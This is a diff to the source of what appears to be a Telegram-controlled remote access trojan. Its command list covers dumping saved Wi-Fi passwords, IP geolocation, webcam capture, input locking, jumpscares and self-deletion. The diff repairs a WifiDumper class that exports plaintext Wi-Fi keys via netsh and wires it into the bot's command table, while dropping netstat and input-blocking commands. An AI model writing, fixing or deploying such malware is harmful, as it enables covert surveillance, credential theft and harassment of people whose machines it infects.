@@ -131,9 +131,8 @@ clear - Removes all cv2 windows, closes webcam and removes temporary files.
 selfdestruction - Removes the program from the machine permanently.
 
 🌐 Network & Remote Access
-netstat – Show network connections.
-wifiinfo – Dump saved Wi-Fi SSIDs and passwords.
-ipinfo – Get public IP and geolocation.
+wifiinfo - Dump saved Wi-Fi SSIDs and passwords.
+ipinfo - Get public IP and geolocation.
 
 📸 Camera & Screen
 selfie - Take a webcam selfie.
@@ -176,8 +175,6 @@ randomkeyboard - Sets all user's input to random characters.
 capslock - Activates capslock.
 mousecontroller - Sends a mouse controlling menu.
 mouselock - Locks the mouse in position.
-inputblock - Blocks mouse and keyboard.
-inputunblock - Unblocks mouse and keyboard.
 
 📋 Messaging
 bsend - Send custom text.
@@ -410,7 +407,10 @@ def toducky(payload, execute=False) -> str:
     return final
 
 class WifiDumper:
-    def extract_all() -> dict[str:str]:
+    def __init__(self) -> None:
+        pass
+
+    def extract_all(self) -> dict[str:str]:
         sp.run("netsh wlan export profile key=clear", stdout=sp.PIPE, stderr=sp.PIPE)
         xmls = []
         wifis = {} 
@@ -726,7 +726,7 @@ class PeppinoTelegram:
             self.mixer_menu_keyboard = None
             self.mouse_controller_menu = None
             self.display_mode_keyboard  = None
-            self.wifidumper = WifiDumper
+            self.wifidumper = WifiDumper()
             #converts text to functions
             self.function_table: dict[str:Callable] = {
                 "pss":self.pss,
@@ -763,11 +763,8 @@ class PeppinoTelegram:
                 "distortedscreen":self.distorted_screen,
                 "displaymode":self.display_mode,
                 "jumpscarenoaudio":self.jumpscarenoaudio,
-                "netstat":self.netstat,
                 "ipinfo":self.ipinfo,
                 "mouselock":self.mouselock,
-                "inputblock":self.block_input,
-                "inputunblock":self.unblock_input,
                 #"keyboardlock":self.keyboardlock,
                 "fullclip":self.record_webcam_and_screen,
                 "selfdestruction":self.selfdestruction,
@@ -840,12 +837,6 @@ class PeppinoTelegram:
                 raise ConnectionError
             except Exception as e:
                 return self.bsend(text, retries+1)
-
-        def block_input(self) -> None:
-            ctypes.windll.user32.BlockInput(True)
-
-        def unblock_input(self) -> None:
-            ctypes.windll.user32.BlockInput(False)
 
         def cantopen(self, process: str) -> None:
             self.cantopenlist.append(process)
@@ -1074,9 +1065,6 @@ class PeppinoTelegram:
 
         def new_menu(self, menu: dict[str:Any], autosend: bool=True, label: str="Choose an option: ", page: int=0, next_btn: bool=False, next_btn_lab: str="next_page", prev_btn_lab: str="previus_page", close_btn_lab: str="close_page", rows=2) -> ButtonsMenu:
             return ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn, next_btn_lab=next_btn_lab, prev_btn_lab=prev_btn_lab, close_btn_lab=close_btn_lab, keyboard_rows=rows)
-
-        def netstat(self) -> None:
-            self.execute("netstat")
 
         def on_callback_query(self, msg) -> None:
             query_id, from_id, data = glance(msg, flavor="callback_query")
